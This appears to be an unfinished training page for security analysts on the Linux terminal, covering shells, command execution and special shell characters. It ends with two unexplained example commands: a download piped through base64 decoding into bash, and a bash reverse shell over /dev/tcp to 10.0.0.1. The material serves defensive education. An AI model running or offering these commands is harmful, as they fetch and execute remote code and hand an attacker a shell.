---
layout: series
title: The Linux Terminal
permalink: /linux-overview/terminal/
series: Linux for Security Analysts
weight: 4.0
---

## Overview

* The Command Execution Process
* File Descriptors
* Special Characters
* Practical Examples

### Common Shells

There are many, many types of shells available to Linux and macOS users, but security analysts often see just a few of the most common:

* **sh**: Bourne Shell - One of the original shells, which defined a lot of the syntax and scripting language used today
* **bash**: Bourne Again Shell - Probably the most common shell after `sh`
* **busybox**: Busybox - Commonly used on OT devices and small microcontrollers, because it bundles many tools into built-in commands
* **zsh**: Z Shell - The default shell on macOS hosts, so if you see this and aren't sure of the OS, it's likely an Apple device
* **ash**: Almquist Shell
* **dash**: Debian Almquist Shell

## The Command Execution Process

In a normal application, command execution typically follows the pattern:

1. User inputs command
2. Shell resolves command to a binary and prepares to execute
3. Shell forks itself into a new child process
4. Shell passes command to child process and executes the binary
5. Child process executes its application
6. Child exits and returns a code to its parent shell
7. Shell prompts user for a new command

This doesn't cover background jobs or anything fancy - just a basic call to a basic application.

## File Descriptors

### Standard File Descriptors

### I/O Redirection

### Per-Process File Descriptors

### Common Process Streams

## Special Shell Characters

| Symbol | Description |
| -- | -- |
| `;` | Substitute for newlines. Run cmd2 after cmd1 completes |
| `&` | Create a job (background process). Return to shell immediately |
| `&&` | Run cmd2 if cmd1 completes successfully |
| `\|\|` | Run cmd2 if cmd1 does not successfully complete |
| `$()` | Executes the command inside the parentheses |
| \`\` | Same as `$()` |

## Shell Profiles

## Practical Examples

```sh
$ (curl -fsSL $URL || wget -q -O- $URL) | base64 -d | /bin/bash
```

```sh
$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
